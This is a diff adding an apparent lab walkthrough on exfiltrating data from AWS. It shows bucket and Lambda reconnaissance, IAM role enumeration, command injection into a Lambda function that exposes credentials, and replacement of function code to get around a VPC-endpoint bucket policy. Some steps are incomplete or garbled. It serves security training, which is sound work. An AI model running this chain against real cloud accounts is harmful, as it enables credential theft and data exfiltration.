@@ -1,0 +1,282 @@
+Lambda - Data Exfiltration 
+
+1) List buckets
+Command: aws s3 ls
+
+Output:
+2025-09-23 21:56:16 mauhur-coins-514015205829
+2025-09-23 21:56:16 mordor-pics-514015205829
+
+2) Read bucket policy attached to the S3 bucket 
+Command: aws s3api get-bucket-policy --bucket mauhur-coins-XXXXXXXXXXXX --query Policy --output text | jq .
+
+**Identify if All access to the bucket is restricted to the specific VPC Endpoint**
+
+Output:
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Sid": "Statement1",
+      "Effect": "Deny",
+      "Principal": "*",
+      "NotAction": "s3:PutObject",
+      "Resource": "arn:aws:s3:::mauhur-coins-514015205829/*",
+      "Condition": {
+        "StringNotEquals": {
+          "aws:SourceVpce": "vpce-0a1028b0fbfa8561f"
+        }
+      }
+    }
+  ]
+}
+
+3) List VPCs
+Command: aws ec2 describe-vpc-endpoints
+
+Output:
+{
+    "VpcEndpoints": [
+        {
+            "VpcEndpointId": "vpce-0a1028b0fbfa8561f",
+            "VpcEndpointType": "Gateway",
+            "VpcId": "vpc-0a0609deb96845be6",
+
+4) Reconnaissance of Lambda functions
+List the functions with the below command: aws lambda list-functions
+
+Output:
+"Functions": [
+        {
+            "FunctionName": "download-images",
+            "FunctionArn": "arn:aws:lambda:us-east-1:514015205829:function:download-images",
+            "Runtime": "python3.13",
+            "Role": "arn:aws:iam::514015205829:role/VPCLambda-AmazonS3FullAccess",
+            "Handler": "index.lambda_handler",
+            "CodeSize": 539,
+            "Description": "Retrieves images from the Mordor Travel Agency",
+            "Timeout": 3,
+            "MemorySize": 128,
+            "LastModified": "2025-09-23T21:56:36.713+0000",
+            "CodeSha256": "pWRkZ0FdnRykSJSw3/EW9njEiv19ow9w9BzzeSaYexU=",
+            "Version": "$LATEST",
+            "VpcConfig": {
+                "SubnetIds": [
+                    "subnet-0411cec163bfeba56"
+                ],
+                "SecurityGroupIds": [
+                    "sg-0bc7232ddf4e28daf"
+                ],
+                "VpcId": "vpc-0a0609deb96845be6",
+                "Ipv6AllowedForDualStack": false
+            },
+            "Environment": {
+                "Variables": {
+                    "LOG_LEVEL": "INFO",
+                    "IMAGE_BUCKET": "mordor-pics-514015205829"
+                }
+            },
+            "TracingConfig": {
+                "Mode": "PassThrough"
+            },
+            "RevisionId": "d593071b-3bc9-492d-a4b5-0af42c6ce3dc",
+            "PackageType": "Zip",
+            "Architectures": [
+                "x86_64"
+            ],
+            "EphemeralStorage": {
+                "Size": 512
+            },
+            "SnapStart": {
+                "ApplyOn": "None",
+                "OptimizationStatus": "Off"
+            },
+            "LoggingConfig": {
+                "LogFormat": "Text",
+                "LogGroup": "/aws/lambda/download-images"
+            }
+        },
+        {
+            "FunctionName": "list-images",
+            "FunctionArn": "arn:aws:lambda:us-east-1:514015205829:function:list-images",
+            "Runtime": "python3.13",
+            "Role": "arn:aws:iam::514015205829:role/MordorTravel-ReadImageBucket",
+            "Handler": "index.lambda_handler",
+            "CodeSize": 449,
+            "Description": "Lists all files from the Mordor Travel Agency",
+            "Timeout": 3,
+            "MemorySize": 128,
+            "LastModified": "2025-09-23T21:56:48.417+0000",
+            "CodeSha256": "OfhZr9GyaI3VmMKpFlyKvZGOOsxZav2DA6SReLEad2M=",
+            "Version": "$LATEST",
+            "Environment": {
+                "Variables": {
+                    "LOG_LEVEL": "INFO",
+                    "IMAGE_BUCKET": "mordor-pics-514015205829"
+                }
+            },
+            "TracingConfig": {
+                "Mode": "PassThrough"
+
+
+            },
+            "RevisionId": "b42eed99-c91b-4dc6-9bf0-8153bb97ca2d",
+            "PackageType": "Zip",
+            "Architectures": [
+                "x86_64"
+            ],
+            "EphemeralStorage": {
+                "Size": 512
+            },
+            "SnapStart": {
+                "ApplyOn": "None",
+                "OptimizationStatus": "Off"
+            },
+            "LoggingConfig": {
+                "LogFormat": "Text",
+                "LogGroup": "/aws/lambda/list-images"
+            }
+
+4.2) Get the policies attached to each function
+Run the following code in the AttackBox
+
+//CODE BEGINS
+FUNCTIONS="list-images download-images"
+
+for f in $FUNCTIONS ; do
+    ROLE=`aws lambda get-function --function-name $f --query Configuration.Role --output text | awk -F\/ '{print $NF}'`
+    echo "$f has $ROLE with these managed policies:"
+    aws iam list-attached-role-policies --role-name $ROLE
+    for p in `aws iam list-role-policies  --role-name $ROLE --query PolicyNames --output text` ; do
+        echo "$ROLE for $f has inline policy $p:"
+        aws iam get-role-policy --role-name $ROLE --policy-name $p
+    done
+done
+//CODE END
+
+Note: The above commands will iterate the list of  functions, and for each, extract the functions execution role in the variable ROLE. It then lists the attached policies for the role, and any inline policies for the role. 
+
+Output:
+list-images has MordorTravel-ReadImageBucket with these managed policies:
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "AWSLambda_FullAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AWSLambda_FullAccess"
+        }
+    ]
+}
+MordorTravel-ReadImageBucket for list-images has inline policy ReadImageBucket:
+{
+    "RoleName": "MordorTravel-ReadImageBucket",
+    "PolicyName": "ReadImageBucket",
+    "PolicyDocument": {
+        "Version": "2012-10-17",
+        "Statement": [
+            {
+                "Action": [
+                    "s3:List*"
+                ],
+                "Resource": [
+                    "arn:aws:s3:::mordor-pics-514015205829"
+                ],
+                "Effect": "Allow"
+            },
+            {
+                "Action": [
+                    "logs:*"
+                ],
+                "Resource": [
+                    "*"
+                ],
+                "Effect": "Allow"
+            }
+        ]
+    }
+}
+download-images has VPCLambda-AmazonS3FullAccess with these managed policies:
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "AWSLambdaVPCAccessExecutionRole",
+            "PolicyArn": "arn:aws:iam::aws:policy/service-role/AWSLambdaVPCAccessExecutionRole"
+        },
+        {
+            "PolicyName": "AWSLambdaBasicExecutionRole",
+            "PolicyArn": "arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole"
+        },
+        {
+            "PolicyName": "AmazonS3FullAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AmazonS3FullAccess"
+        }
+    ]
+}
+
+
+
+4.3) Attack list_images function
+Use the following code to return the files from the function in the attackbox
+
+def lambda_handler(event, context):
+
+  command = f"aws s3 ls s3://{os.environ['list-images']}/{event['prefix']}"
+  files = os.popen(command).read()
+  return(files)
+
+Note: When passed the following JSON, this function will return a list of objects in the IMAGE_BUCKET, then run whatever else we add to the end of the command.
+
+4.4) Modify the bucket to the bucket 
+Save the index.py file, and create a new zip file with this command run from inside the download-images directory.
+
+zip -r ../compromised.zip index.py
+
+5) Exfiltrate credentials
+Create a new file called payload.json.
+That file will tell the function to run the unix command env which will print out all the environment variables used by the function.
+After that run the following command to save the credentials exfiltrated
+
+Command: aws lambda invoke --function-name list-images --payload fileb://payload.json output.json
+cat output.json | jq -r . | grep AWS
+
+Output: 
+AWS_LAMBDA_FUNCTION_VERSION=$LATEST
+AWS_EXECUTION_ENV=AWS_Lambda_python3.13
+AWS_DEFAULT_REGION=us-east-1
+AWS_LAMBDA_LOG_STREAM_NAME=2025/09/24/[$LATEST]0534d063450a4ce98b9f7d9a771cff62
+AWS_REGION=us-east-1
+AWS_SECRET_ACCESS_KEY=
+AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/list-images
+AWS_LAMBDA_RUNTIME_API=169.254.100.1:9001
+AWS_LAMBDA_FUNCTION_MEMORY_SIZE=128
+_AWS_XRAY_DAEMON_ADDRESS=169.254.100.1
+AWS_XRAY_DAEMON_ADDRESS=169.254.100.1:2000
+AWS_ACCESS_KEY_ID=ASIA*******
+AWS_LAMBDA_FUNCTION_NAME=list-images
+AWS_LAMBDA_INITIALIZATION_TYPE=on-demand
+AWS_SESSION_TOKEN=AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
+_AWS_XRAY_DAEMON_PORT=2000
+
+5.2) Export the new credentials
+Commands:
+user@machine$ export AWS_SESSION_TOKEN=
+user@machine$ export AWS_SECRET_ACCESS_KEY=
+user@machine$ export AWS_ACCESS_KEY_ID=ASIA
+
+
+5.3) Validate that you're using the Lambda function's credentials
+Command: aws sts get-caller-identity
+
+Output:
+{
+    "UserId": "AROAXPLNRTHCUYIFXIQYX:list-images",
+    "Account": "514015205829",
+    "Arn": "arn:aws:sts::514015205829:assumed-role/MordorTravel-ReadImageBucket/list-images"
+}
+
+6) Compromise VPC-enabled Function
+Update the other function called download-images with the follwowing command
+Command: aws lambda update-function-code --region us-east-1 --function-name download-images --zip-file fileb://compromised.zip
+
+Create another file called payload2.json and invoke the lambda again to obtain the object.
+Command: aws lambda invoke --function-name download-images --payload fileb://payload2.json output2.json
+
